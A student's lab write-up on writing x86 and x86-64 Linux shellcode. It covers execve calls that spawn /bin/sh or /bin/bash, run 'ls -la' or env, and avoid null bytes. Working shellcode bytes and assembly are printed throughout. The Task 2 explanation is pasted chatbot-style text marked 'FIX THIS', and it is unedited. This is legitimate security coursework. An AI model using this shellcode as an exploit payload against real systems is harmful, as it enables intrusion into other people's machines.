# Lab 10 - Shellcode

# Task 1.a - the entire process
- compile to object code: `nasm -f elf32 mysh.s -o mysh.o`
- Linking to generate final binary: `ld -m elf_i386 mysh.o -o mysh`
- check shell process: `echo $$`
  > 1
- launch the executable: `./mysh`
- check shell process again: `echo $$`
  > 43
- Getting the machine code: `objdump -Mintel --disassemble mysh.o`
  ```bash
  mysh.o:     file format elf32-i386


  Disassembly of section .text:

  00000000 <_start>:
    0:	31 c0                	xor    eax,eax
    2:	50                   	push   eax
    3:	68 2f 2f 73 68       	push   0x68732f2f
    8:	68 2f 62 69 6e       	push   0x6e69622f
    d:	89 e3                	mov    ebx,esp
    f:	50                   	push   eax
    10:	53                   	push   ebx
    11:	89 e1                	mov    ecx,esp
    13:	31 d2                	xor    edx,edx
    15:	31 c0                	xor    eax,eax
    17:	b0 0b                	mov    al,0xb
    19:	cd 80                	int    0x80

  ```
- use xxd: `xxd -p -c 20 mysh.o`
  ```bash
  7f454c4601010100000000000000000001000300
  0100000000000000000000004000000000000000
  3400000000002800050002000000000000000000
  0000000000000000000000000000000000000000
  0000000000000000000000000000000000000000
  0000000001000000010000000600000000000000
  100100001b000000000000000000000010000000
  0000000007000000030000000000000000000000
  3001000021000000000000000000000001000000
  0000000011000000020000000000000000000000
  6001000040000000040000000300000004000000
  1000000019000000030000000000000000000000
  a00100000f000000000000000000000001000000
  00000000000000000000000031c050682f2f7368
  682f62696e89e3505389e131d231c0b00bcd8000
  00000000002e74657874002e7368737472746162
  002e73796d746162002e73747274616200000000
  0000000000000000000000000000000000000000
  0000000000000000010000000000000000000000
  0400f1ff00000000000000000000000003000100
  08000000000000000000000010000100006d7973
  682e73005f73746172740000
  ```
- "should be" shellcode: `31c050682f2f7368682f62696e89e3505389e131d231c0b00bcd80`
- execute the py script: `./convert.py`
  ```python
  shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
   "\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
  ).encode('latin-1')
  ```

---

# Task 1.b - Eliminating Zeros from the Code
## Questions & identify 4 places
### 1-2-3
- lines 5, 17 and 20
  - xor eax/edx
- (sidenote): 
  - pushing a value (not necessarily stored in a register) means writing it to the stack
  - popping means restoring whatever is on top of the stack into a register. 
> Explain why `xor eax, eax` works
- that's basically how the xor works, it's "true" only if the two operands are different, so if you do the xor between the same thing they're always going to be equal hence the result is going to be 0 in any case
### 4
- lines 21
- first it reset eax to 0, and then exploits al to set 0b at the end:
  ```mov   al, 0x0b```

### actual task
- build and run our custom mybash.s:
  `nasm -f elf32 mybash.s -o mybash.o && ld -m elf_i386 mybash.o -o mybash && ./mybash`
- in our custom mybash.sh as last thing we push the first 8 bytes of our instruction (`/bin` ; `/bas`)
- then we use a register to hold a string with the 9th byte of the command (`h`) with a 3-characters placeholder at the end (`###`)
- then we use the shift approach to delete the whole placeholder, in order to have our sweet command (`/bin/bash`)
```asm
mov esi, "h###"
shl esi, 24
shr esi, 24
push esi
push "/bas"
push "/bin"
```
- we could also use the eax register, but in that case we also need to "clean it" afterwards since it's used later, bringing it back to 0:
  ```asm
  mov eax, "h###"
  shl eax, 24
  shr eax, 24
  push eax
  push "/bas"
  push "/bin"
  xor  eax, eax
  ```
- As required, we are not using any redundant `/` neither any 0, but just exploiting one of the "zeroing" mechanism (the shift one)
- in the original script we found the first two approaches explained in the readme used, and we adopted the third one to solve the task.

---

# Task 1.c - Providing Arguments for System Calls
- we took these steps:
  1. push 0 and the shell instruction, then save the stack pointer to ebx
     ```asm
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"       ; [1]
      push "/bin"
      mov  ebx, esp     ; Get the string address
     ```
  2. push another 0 (which will be the termination of the command string)
     ```asm
      push eax 
     ```
  3. save "la" in esi with two placeholders at the end (in order to have 4 bytes) and then replace those with 0s with the shift. then push esi onto the stack (we don't need to save esp now because this part is the continuation of the ls command, argv[2])
     ```asm
      mov esi, "la##"
      shl esi, 16
      shr esi, 16 ; "la00"
      push esi
     ```
  4. push "ls -" onto the stack and save the pointer in ecx
     ```asm
      push "ls -"
      mov ecx, esp
     ```
  5. save "-c" in eax with two placeholders at the end, again replaced by 0s with shift. Then push it and save its pointer to edi
     ```asm
      mov eax, "-c##"
      shl eax, 16
      shr eax, 16 ; "-c00"
      push eax
      mov edi, esp
     ```
  6. push another 0 to terminate the whole string (argv[3])
     ```asm
      xor eax, eax
      push eax
     ```
  7. push the pointers to the various argv and save the pointer of the beginning of argv in ecx
     ```asm
      push ecx
      push edi
      push ebx          
      mov  ecx, esp     
     ```
  8. terminate the program
     ```asm
      ; For environment variable 
      xor  edx, edx     ; No env variables      [4]

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
     ```
- the stack situation at the end is:
  ```
    0
    //sh
    /bin <- ebx
    0
    la00
    ls - <- ecx
    -c00 <- edi
    0 <- edx
    0
    ecx -> ls -la
    edi -> -c
    ebx -> /bin/sh
  ```

---

# Task 1.d - Providing Environment Variables for execve()
- the base mechanism for this task is similar to the previous one: we have to prepare the array containing the environment variables, keep track of the pointer to each env[n] and push everything correctly. So:
  1. Push 0, the instruction to get the environment and the termination of the env array:
    ```asm
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "/env"
      push "/bin"       
      push "/usr"
      mov  ebx, esp     ; Get the string address

      ; env[3] = 0          // 0 marks the end of the array
      push eax     
    ```
  2. push env[2]="cccc=1234" exploiting the shift trick, since we need to add 9 bytes. Then save the stack pointer in `edi`
    ```asm
      push eax
      mov edi, "4###"
      shl edi, 24
      shr edi, 24
      push edi
      push "=123"
      push "cccc"
      mov edi, esp
    ```
  3. push env[1] = "bbb=5678" and save stack pointer to `esi`
    ```asm
      push eax
      push "5678"
      push "bbb="
      mov esi, esp
    ```
  4. push env[0] = "aaa=1234" and save pointer to edx
    ```asm
      push eax
      push "1234"
      push "aaa="
      mov edx, esp
    ```
  5. push argv, which in this case only contains the env command, and save pointer in `ecx`
    ```asm
      push eax
      push ebx          ; argv[0] points "/usr/bin/env"   [3]
      mov  ecx, esp     ; Get the address of argv[]
    ```
  6. push the pointers to the environment variables and then save stack pointer in `edx`
    ```asm
      ; For environment variable 
      push eax
      push edi
      push esi
      push edx

      mov edx, esp
    ```
  7. terminate the program
    ```asm
      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
    ```
- the final situation of the stack is as follows:
  ```
    /env
    /bin
    /usr <- ebx
    0
    4000
    =123
    cccc <- edi
    0
    5678
    bbb= <- esi
    1234
    aaa= <- edx
    0
    ebx -> argv[0] <- ecx
    0
    edi -> env[2]
    esi -> env[1]
    edx -> env[0] <- edx
  ```

---

# Task 2 $-$ Using Code Segment
## Provide detailed explanation
1. ...

(FIX THIS)
The BITS 32 directive specifies that the code should be assembled for a 32-bit x86 architecture.

The jmp short two instruction causes the program to jump to the two label.

The one label marks the beginning of a block of code that is called by the call one instruction at the two label. This block of code starts by popping a value from the stack and storing it in the ebx register using the pop ebx instruction.

The code then sets the value of the eax register to zero using the xor eax, eax instruction. The mov [ebx+7], al instruction stores the least significant byte of the eax register (which is zero) at the memory location specified by the address in ebx plus 7.

The mov [ebx+8], ebx instruction stores the value of the ebx register at the memory location specified by the address in ebx plus 8. The mov [ebx+12], eax instruction stores the value of the eax register at the memory location specified by the address in ebx plus 12.

The lea ecx, [ebx+8] instruction loads the effective address specified by ebx plus 8 into the ecx register. The xor edx, edx instruction sets the value of the edx register to zero.

The mov al, 0x0b instruction moves the value 0x0b (11 in decimal) into the least significant byte of the eax register. The int 0x80 instruction is a software interrupt that causes the processor to execute a specific system call. In this case, the value in the al register specifies which system call to execute.

The db '/bin/sh*AAAABBBB' directive defines a string that is stored in the program's data section. This string appears to be the string '/bin/sh' followed by 8 bytes of data ('AAAABBBB').

I hope this helps to clarify the meaning of this assembly code. Let me know if you have any further questions.
(FINISH FIX)

---

# Task 3 $-$ Writing 64-bit Shellcode
- Basically, starting from the provided example we can change the existing command and replace the final part with `bas`. Then we just need to add the `h` at the end, to do so we can either:
  1. use a temporary register to save the `h` with 7 placeholders and then remove them with the shift trick:
    ```asm
      mov rbx, 'h#######'
      shl rbx, 56
      shr rbx, 56
      push rbx
    ```
  2. or just push the `h` alone
    ```asm
      push 'h'
    ```
- so the complete code can be as follow:
  ```asm
    section .text
      global _start
        _start:
          xor rdx, rdx
          push rdx
          ;push 'h'             ; alternative version
          mov rbx, 'h#######'
          shl rbx, 56
          shr rbx, 56
          push rbx
          mov rax, '/bin/bas'
          push rax
          mov rdi, rsp
          push rdx
          push rdi
          mov rsi, rsp
          xor rax, rax
          mov al, 0x3b
          syscall
  ```
- to execute it we need to adapt our running script:
  - `nasm -f elf64 mtbash_64.s -o mtbash_64.o && ld mtbash_64.o -o mtbash_64 && ./mtbash_64`